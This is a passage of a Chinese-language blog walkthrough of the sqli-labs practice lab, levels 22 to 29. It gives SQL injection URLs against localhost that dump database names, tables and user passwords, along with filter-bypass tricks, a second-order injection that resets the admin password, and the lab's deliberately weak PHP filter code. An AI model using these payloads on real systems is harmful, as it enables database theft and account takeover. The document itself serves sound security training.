class="headerlink" title="手动注入"></a>手动注入</h4><p>与less-21一样需要base64编码</p><h4 id="源码分析-20"><a href="#源码分析-20" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))   <span class="comment">// Quote if not a number</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;<span class="comment">//添加了&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure><h2 id="Page-2-Advanced-Injections"><a href="#Page-2-Advanced-Injections" class="headerlink" title="Page-2 (Advanced Injections)"></a>Page-2 (Advanced Injections)</h2><h3 id="Less-23-GET-Error-based-strip-comments-基于错误的，过滤注释的GET型"><a href="#Less-23-GET-Error-based-strip-comments-基于错误的，过滤注释的GET型" class="headerlink" title="Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)"></a>Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)</h3><h4 id="手动注入-20"><a href="#手动注入-20" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取路径</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,@<span class="variable">@basedir</span>,<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#获取数据库名</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(schema_name) from information_schema.schemata),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#获取security中所有表名</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#获取users中所有列名</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(column_name) from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#获取users中username这一列内容</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(username) from security.users limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#获取users中password这一列内容</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(password) from security.users limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#报错注入获取数据库名</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=1&#x27;</span>or extractvalue(<span class="number">1</span>,concat(0x7e,database())) or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><h4 id="源码分析-21"><a href="#源码分析-21" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p>过滤了<code>#</code>和<code>--</code>这两种注释符号。</p><h3 id="Less-24-Second-Degree-Injections-Real-treat-Store-Injections-二次注入"><a href="#Less-24-Second-Degree-Injections-Real-treat-Store-Injections-二次注入" class="headerlink" title="Less - 24 Second Degree Injections Real treat -Store Injections (二次注入)"></a>Less - 24 Second Degree Injections Real treat -Store Injections (二次注入)</h3><h4 id="手动注入-21"><a href="#手动注入-21" class="headerlink" title="手动注入"></a>手动注入</h4><p>注册一个账号为<code>admin&#39;#</code>的账户</p><p><img src="https://s2.loli.net/2022/05/17/DHwAEfZskga84Cb.png" alt="24_1.png"></p><p>注册成功后在后台可以看到信息</p><p><img src="https://s2.loli.net/2022/05/17/r3VvX1DF96auLeI.png" alt="24_2.png"></p><p>用刚注册的账号登录并修改密码即可更改<code>admin</code>的密码</p><p><img src="https://s2.loli.net/2022/05/17/vnFTACyI8aXpM9J.png" alt="24_3.png"></p><h4 id="源码分析-22"><a href="#源码分析-22" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-25-Trick-with-OR-amp-AND-过滤了or和and"><a href="#Less-25-Trick-with-OR-amp-AND-过滤了or和and" class="headerlink" title="Less-25 Trick with OR &amp; AND (过滤了or和and)"></a>Less-25 Trick with OR &amp; AND (过滤了or和and)</h3><h4 id="绕过or和and过滤"><a href="#绕过or和and过滤" class="headerlink" title="绕过or和and过滤"></a>绕过or和and过滤</h4><p>（1）大小写变形 Or,OR,oR </p><p>（2）编码，hex，urlencode </p><p>（3）添加注释&#x2F;*or*&#x2F; </p><p>（4）利用符号 and&#x3D;&amp;&amp; or&#x3D;||</p><h4 id="手动注入-22"><a href="#手动注入-22" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-25/?id=1&#x27;||1=1--+ </span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-25/?id=1&#x27;<span class="attribute">OOrr</span> <span class="number">1</span>=<span class="number">1</span>--+ </span><br></pre></td></tr></table></figure><h4 id="源码分析-23"><a href="#源码分析-23" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-25a-Trick-with-OR-amp-AND-Blind-过滤了or和and的盲注"><a href="#Less-25a-Trick-with-OR-amp-AND-Blind-过滤了or和and的盲注" class="headerlink" title="Less-25a Trick with OR &amp; AND Blind (过滤了or和and的盲注)"></a>Less-25a Trick with OR &amp; AND Blind (过滤了or和and的盲注)</h3><h4 id="手动注入-23"><a href="#手动注入-23" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-25a/?id=-1 <span class="attribute">UNION</span> <span class="literal">select</span> <span class="number">1</span>,@<span class="variable">@basedir</span>,<span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="Less-26-Trick-with-comments-and-space-过滤了注释和空格的注入"><a href="#Less-26-Trick-with-comments-and-space-过滤了注释和空格的注入" class="headerlink" title="Less-26 Trick with comments and space (过滤了注释和空格的注入)"></a>Less-26 Trick with comments and space (过滤了注释和空格的注入)</h3><h4 id="手动注入-24"><a href="#手动注入-24" class="headerlink" title="手动注入"></a>手动注入</h4><p>我们可以用url编码进行绕过(这些编码在Windows下使用可能会出现问题)</p><p>%09 Tab键（水平）<br>%0a 新建一行<br>%0c 新的一页<br>%0d return 键<br>%0b Tab键（垂直）<br>%a0 空格</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-26/?id=1&#x27;anandd(updatexml(1,concat(0x7e,(<span class="attribute">select</span> @<span class="variable">@version</span>),0x7e),<span class="number">1</span>));%00</span><br></pre></td></tr></table></figure><h4 id="源码分析-24"><a href="#源码分析-24" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out spaces</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-过滤了空格和注释的盲注"><a href="#less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-过滤了空格和注释的盲注" class="headerlink" title="less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)"></a>less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)</h3><h4 id="手动注入-25"><a href="#手动注入-25" class="headerlink" title="手动注入"></a>手动注入</h4><p>不能报错注入，直接盲注即可</p><h4 id="源码分析-25"><a href="#源码分析-25" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out spaces</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out spaces</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-过滤了union和select的"><a href="#less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-过滤了union和select的" class="headerlink" title="less 27 GET - Error Based- All your UNION &amp; SELECT belong to us (过滤了union和select的)"></a>less 27 GET - Error Based- All your UNION &amp; SELECT belong to us (过滤了union和select的)</h3><h4 id="手动注入-26"><a href="#手动注入-26" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-27/?id=1&#x27;and(uPdatexml(1,conCat(0x7e,(<span class="attribute">selEct</span> @<span class="variable">@version</span>),0x7e),<span class="number">1</span>));%00</span><br></pre></td></tr></table></figure><h4 id="源码分析-26"><a href="#源码分析-26" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us"><a href="#less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us" class="headerlink" title="less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us"></a>less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us</h3><h4 id="手动注入-27"><a href="#手动注入-27" class="headerlink" title="手动注入"></a>手动注入</h4><p>不能报错注入，直接盲注即可</p><h4 id="源码分析-27"><a href="#源码分析-27" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out Select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis-基于错误的，有括号的单引号字符型，过滤了union和select等的注入"><a href="#less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis-基于错误的，有括号的单引号字符型，过滤了union和select等的注入" class="headerlink" title="less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis (基于错误的，有括号的单引号字符型，过滤了union和select等的注入)"></a>less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis (基于错误的，有括号的单引号字符型，过滤了union和select等的注入)</h3><h4 id="手动注入-28"><a href="#手动注入-28" class="headerlink" title="手动注入"></a>手动注入</h4><p>双写绕过即可</p><h4 id="源码分析-28"><a href="#源码分析-28" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入"><a href="#less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入" class="headerlink" title="less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入"></a>less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入</h3><h4 id="手动注入-29"><a href="#手动注入-29" class="headerlink" title="手动注入"></a>手动注入</h4><p>双写绕过即可</p><h4 id="源码分析-29"><a href="#源码分析-29" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);//strip out /*</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);//Strip out --.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);//Strip out #.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-29-基于WAF的一个错误"><a href="#Less-29-基于WAF的一个错误" class="headerlink" title="Less-29 基于WAF的一个错误"></a>Less-29 基于WAF的一个错误</h3><h4 id="手动注入-30"><a href="#手动注入-30" class="headerlink" title="手动注入"></a>手动注入</h4><p>注意要配好<code>tomcat</code>的相关环境</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-29/index.jsp?id=1&amp;id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h3 